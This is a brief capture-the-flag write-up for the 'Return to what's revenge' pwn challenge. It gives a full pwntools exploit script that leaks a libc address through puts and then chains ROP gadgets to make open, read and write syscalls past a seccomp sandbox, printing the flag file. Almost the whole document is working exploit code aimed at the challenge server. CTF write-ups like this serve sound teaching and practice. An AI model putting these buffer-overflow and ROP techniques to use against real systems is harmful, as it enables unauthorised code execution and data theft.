This is pretty much the same as `Return to what` except a seccomp sandbox has been implemented. You just have to do an `open` -> `read` -> `write` ROP chain to read the flag. The exploit script should be self explanatory.

```python
#!/usr/bin/env python3

from pwn import *

context.bits = 64
context.arch = 'amd64'

elf = ELF("../publish/return-to-whats-revenge")
libc = ELF("../challenge/libc.so.6")

p = remote("chal.duc.tf", 30006)

main     = elf.sym['main']
puts     = elf.plt['puts']
puts_got = elf.got['puts']
bss_addr = 0x404050
pop_rdi  = 0x00000000004019db

# Leak libc
payload = b"A"*56 + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(main)

p.recv()
p.sendline(payload)

leak         = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - 0x0809c0
gets         = libc.sym['gets']
pop_rsi      = libc.address + 0x0000000000023e6a
pop_rdx      = libc.address + 0x0000000000001b96
pop_rax      = libc.address + 0x00000000000439c8
syscall_ret  = libc.address + 0x00000000000d2975

log.info("puts@LIBC: " + hex(leak))
log.info("Libc base: " + hex(libc.address))
log.info("gets@LIBC: " + hex(gets))

payload = b'A'*56

payload += flat(
    # Read the string "/chal/flag.txt" into the bss section
    pop_rdi, bss_addr, gets,
    # Call `open` to open the flag file. FD = 3
    pop_rdi, bss_addr, pop_rsi, 0, pop_rax, 2, syscall_ret,
    # Read the contents of the flag file into `bss_addr+0x20`
    pop_rdi, 3, pop_rsi, bss_addr+0x20, pop_rdx, 0x30, pop_rax, 0, syscall_ret,
    # Write the contents of `bss_addr+0x20` into stdout
    pop_rdi, 1, pop_rsi, bss_addr+0x20, pop_rdx, 0x30, pop_rax, 1, syscall_ret
)

p.recv()
p.sendline(payload)
p.sendline("/chal/flag.txt")

p.interactive()
```
